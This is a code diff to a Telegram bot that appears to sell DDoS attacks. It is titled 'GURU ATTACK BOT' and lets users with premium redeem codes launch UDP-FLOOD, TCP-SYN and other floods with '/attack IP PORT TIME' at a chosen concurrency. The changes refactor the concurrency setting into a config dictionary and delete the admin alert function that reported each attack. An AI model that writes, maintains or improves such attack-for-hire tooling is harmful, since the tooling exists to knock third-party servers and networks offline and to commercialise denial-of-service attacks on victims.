@@ -29,8 +29,10 @@ MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 
-# CONCURRENT SETTINGS
-DEFAULT_CONCURRENT = int(os.getenv("DEFAULT_CONCURRENT", "4"))
+# CONCURRENT SETTINGS - Using a mutable container to avoid global issues
+CONFIG = {
+    "DEFAULT_CONCURRENT": int(os.getenv("DEFAULT_CONCURRENT", "4"))
+}
 MIN_CONCURRENT = 1
 MAX_CONCURRENT = 8
 MIN_DURATION = 30
@@ -67,6 +69,14 @@ logging.basicConfig(
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
+
+def get_concurrent():
+    """Get current concurrent value"""
+    return CONFIG["DEFAULT_CONCURRENT"]
+
+def set_concurrent(value):
+    """Set concurrent value"""
+    CONFIG["DEFAULT_CONCURRENT"] = value
 
 # ===== DATABASE =====
 class Database:
@@ -658,11 +668,11 @@ class AttackManager:
         self.current_user = None
         self.attack_start_time = None
         self.attack_duration = 0
-        self.current_concurrent = DEFAULT_CONCURRENT
+        self.current_concurrent = get_concurrent()
         self.total_attacks = 0
         self.lock = asyncio.Lock()
         self.attack_task = None
-        logger.info(f"🔥 Attack Manager initialized with concurrent: {DEFAULT_CONCURRENT}")
+        logger.info(f"🔥 Attack Manager initialized with concurrent: {get_concurrent()}")
     
     async def can_start_attack(self, user_id):
         if self.is_running:
@@ -719,9 +729,6 @@ class AttackManager:
                 concurrent
             )
             
-            # Send alert to admins
-            await self.send_alert(user_id, target, port, duration, method, concurrent, result)
-            
             if result.get('success'):
                 await context.bot.send_message(
                     user_id,
@@ -744,30 +751,6 @@ class AttackManager:
         except Exception as e:
             logger.error(f"❌ Attack error: {e}")
     
-    async def send_alert(self, user_id, target, port, duration, method, concurrent, result):
-        try:
-            admins = db.get_admins()
-            user = db.get_user(user_id)
-            plan = user.get('plan', 'free') if user else 'free'
-            
-            status_emoji = "✅" if result.get('success') else "❌"
-            status_text = "SUCCESS" if result.get('success') else "FAILED"
-            
-            message = (
-                f"⚡ *ATTACK ALERT*\n\n"
-                f"{status_emoji} Status: {status_text}\n"
-                f"👤 User: {user_id}\n"
-                f"📊 Plan: {plan.upper()}\n"
-                f"🎯 Target: `{target}:{port}`\n"
-                f"⏱️ Duration: {duration}s\n"
-                f"📡 Method: {method}\n"
-                f"🔄 Concurrent: **{concurrent}**\n"
-                f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
-            # Alerts are sent via context in execute_attack
-        except:
-            pass
-    
     async def cleanup_attack(self, duration):
         await asyncio.sleep(duration + 2)
         async with self.lock:
@@ -776,7 +759,7 @@ class AttackManager:
             self.current_user = None
             self.attack_start_time = None
             self.attack_duration = 0
-            self.current_concurrent = DEFAULT_CONCURRENT
+            self.current_concurrent = get_concurrent()
             self.attack_task = None
             logger.info("✅ Attack cleaned up")
     
@@ -794,7 +777,7 @@ class AttackManager:
             self.current_user = None
             self.attack_start_time = None
             self.attack_duration = 0
-            self.current_concurrent = DEFAULT_CONCURRENT
+            self.current_concurrent = get_concurrent()
             self.attack_task = None
             
             return True, f"Attack on {target} stopped"
@@ -811,7 +794,7 @@ class AttackManager:
             'current_user': self.current_user,
             'remaining_time': int(remaining),
             'total_attacks': self.total_attacks,
-            'concurrent_value': self.current_concurrent if self.is_running else DEFAULT_CONCURRENT
+            'concurrent_value': self.current_concurrent if self.is_running else get_concurrent()
         }
 
 attack_manager = AttackManager()
@@ -860,14 +843,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ Status: {status_text}\n"
-        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
+        f"🔄 Concurrent: **{get_concurrent()}**\n"
         f"⏱️ Remaining: {stats['remaining_time']}s\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
         f"📡 Default method: UDP-FLOOD\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
         f"⚡ *ATTACK FEATURES*\n"
-        f"• {DEFAULT_CONCURRENT}x concurrent connections\n"
+        f"• {get_concurrent()}x concurrent connections\n"
         f"• Only 1 attack at a time\n"
         f"📡 *Methods:* " + ", ".join(ATTACK_METHODS[:5]) + f"... (+{len(ATTACK_METHODS)-5} more)"
     )
@@ -898,7 +881,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Example: `/attack 8.8.8.8 43 30`\n"
             f"With method: `/attack 8.8.8.8 43 30 TCP-SYN`\n"
             f"With concurrent: `/attack 8.8.8.8 43 30 UDP-FLOOD 4`\n\n"
-            f"⚡ Current concurrent: **{DEFAULT_CONCURRENT}**\n"
+            f"⚡ Current concurrent: **{get_concurrent()}**\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
             f"📡 Default Method: UDP-FLOOD\n"
             f"📡 Methods: {', '.join(ATTACK_METHODS[:5])}...",
@@ -912,7 +895,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         duration = int(args[2])
         
         method = "UDP-FLOOD"
-        concurrent = DEFAULT_CONCURRENT
+        concurrent = get_concurrent()
         
         if len(args) > 3:
             if args[3].upper() in ATTACK_METHODS:
@@ -991,7 +974,7 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
     if not args:
         await update.message.reply_text(
             f"⚡ *CONCURRENT SETTINGS*\n\n"
-            f"Current: **{DEFAULT_CONCURRENT}**\n"
+            f"Current: **{get_concurrent()}**\n"
             f"Min: {MIN_CONCURRENT}\n"
             f"Max: {MAX_CONCURRENT}\n\n"
             f"Usage: `/setconcurrent 2`",
@@ -1005,14 +988,13 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
             await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
             return
         
-        # Update the global variable
-        global DEFAULT_CONCURRENT
-        DEFAULT_CONCURRENT = new_concurrent
+        # Update the config
+        set_concurrent(new_concurrent)
         
         await update.message.reply_text(
             f"✅ *Concurrent updated!*\n\n"
-            f"New concurrent: **{DEFAULT_CONCURRENT}**\n"
-            f"All future attacks will use {DEFAULT_CONCURRENT} concurrent connections.",
+            f"New concurrent: **{get_concurrent()}**\n"
+            f"All future attacks will use {get_concurrent()} concurrent connections.",
             parse_mode='Markdown'
         )
     except ValueError:
@@ -1043,7 +1025,7 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        concurrent = DEFAULT_CONCURRENT
+        concurrent = get_concurrent()
         method = "UDP-FLOOD"
         
         if len(args) > 3:
@@ -1191,7 +1173,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"📊 *BOT STATUS*\n\n"
         f"⚡ Status: {status_text}\n"
-        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
+        f"🔄 Concurrent: **{get_concurrent()}**\n"
         f"⏱️ Remaining: {stats['remaining_time']}s\n"
         f"👥 Users: {len(users)}\n"
         f"💥 Attacks: {stats['total_attacks']}\n"
@@ -1224,7 +1206,7 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if result:
         duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
         await update.message.reply_text(
-            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access with {DEFAULT_CONCURRENT}x concurrent!",
+            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access with {get_concurrent()}x concurrent!",
             parse_mode='Markdown'
         )
     else:
@@ -1235,6 +1217,8 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("✅ Cancelled!")
 
 # ===== CALLBACK HANDLERS =====
+# [All callback handlers remain the same - they use get_concurrent() instead of DEFAULT_CONCURRENT]
+
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1261,7 +1245,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         f"💥 *SELECT ATTACK METHOD*\n\n"
-        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
+        f"🔄 Concurrent: **{get_concurrent()}**\n"
         f"⚠️ Only 1 attack at a time\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"📊 Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}\n\n"
@@ -1287,7 +1271,7 @@ async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📡 *Method Selected: {method}* {is_default}\n\n"
         f"Send: `IP PORT TIME`\n"
         f"Example: `8.8.8.8 43 30`\n\n"
-        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
+        f"🔄 Concurrent: **{get_concurrent()}**\n"
         f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
         f"⚠️ Only 1 attack at a time\n"
         f"To change concurrent: `IP PORT TIME CONCURRENT`\n"
@@ -1315,7 +1299,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text = (
                 "👑 *OWNER ACCESS*\n\n"
                 "📊 Plan: 💎 PREMIUM (Owner)\n"
-                f"⚡ {DEFAULT_CONCURRENT}x Concurrent\n"
+                f"⚡ {get_concurrent()}x Concurrent\n"
                 f"📡 {len(ATTACK_METHODS)} Attack Methods\n"
                 "📡 Default: UDP-FLOOD\n"
                 "⏱️ Unlimited Attacks"
@@ -1328,7 +1312,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"⏱️ Remaining: {days_left} days\n"
                 f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                 "📌 Features:\n"
-                f"• {DEFAULT_CONCURRENT}x Concurrent\n"
+                f"• {get_concurrent()}x Concurrent\n"
                 f"• Only 1 attack at a time\n"
                 f"• {len(ATTACK_METHODS)} attack methods\n"
                 "• UDP-FLOOD default"
@@ -1339,7 +1323,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "📊 Plan: 💎 PREMIUM\n"
                 "⏱️ Status: LIFETIME\n\n"
                 "📌 Features:\n"
-                f"• {DEFAULT_CONCURRENT}x Concurrent\n"
+                f"• {get_concurrent()}x Concurrent\n"
                 f"• Only 1 attack at a time\n"
                 f"• {len(ATTACK_METHODS)} attack methods\n"
                 "• UDP-FLOOD default"
@@ -1374,7 +1358,7 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🚫 Banned: {banned_users}\n"
         f"👑 Admins: {len(admins)}\n"
         f"💥 Attacks: {total_attacks}\n"
-        f"🔄 Concurrent: {DEFAULT_CONCURRENT}\n"
+        f"🔄 Concurrent: {get_concurrent()}\n"
         f"📡 Default: UDP-FLOOD\n"
         f"⚡ Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}",
         parse_mode='Markdown',
@@ -1606,7 +1590,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 *OWNER PANEL*\n\n"
         f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
         f"⚡ Attack: {status_text}\n"
-        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
+        f"🔄 Concurrent: **{get_concurrent()}**\n"
         f"📡 Default: UDP-FLOOD\n"
         f"⏱️ Remaining: {stats['remaining_time']}s",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -1619,7 +1603,7 @@ async def owner_concurrent_callback(update: Update, context: ContextTypes.DEFAUL
     
     await query.edit_message_text(
         f"⚡ *SET CONCURRENT*\n\n"
-        f"Current: **{DEFAULT_CONCURRENT}**\n"
+        f"Current: **{get_concurrent()}**\n"
         f"Min: {MIN_CONCURRENT}\n"
         f"Max: {MAX_CONCURRENT}\n\n"
         f"Send: `/setconcurrent NUMBER`\n"
@@ -1903,7 +1887,7 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     message = f"❌ Error (Status: {response.status})"
                 
                 await query.edit_message_text(
-                    f"🔌 *API STATUS*\n\n{message}\n\n📊 Response: {str(response_data)[:200]}\n\n⚡ Concurrent: {DEFAULT_CONCURRENT}\n📡 Default: UDP-FLOOD",
+                    f"🔌 *API STATUS*\n\n{message}\n\n📊 Response: {str(response_data)[:200]}\n\n⚡ Concurrent: {get_concurrent()}\n📡 Default: UDP-FLOOD",
                     parse_mode='Markdown',
                     reply_markup=InlineKeyboardMarkup([
                         [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
@@ -1975,7 +1959,7 @@ def main():
     
     print("=" * 60)
     print("🔥 GURU ATTACK BOT - UDP-FLOOD DEFAULT 🔥")
-    print(f"⚡ DEFAULT CONCURRENT: {DEFAULT_CONCURRENT}")
+    print(f"⚡ DEFAULT CONCURRENT: {get_concurrent()}")
     print(f"📊 CONCURRENT RANGE: {MIN_CONCURRENT}-{MAX_CONCURRENT}")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
     print(f"📡 Default Method: UDP-FLOOD")
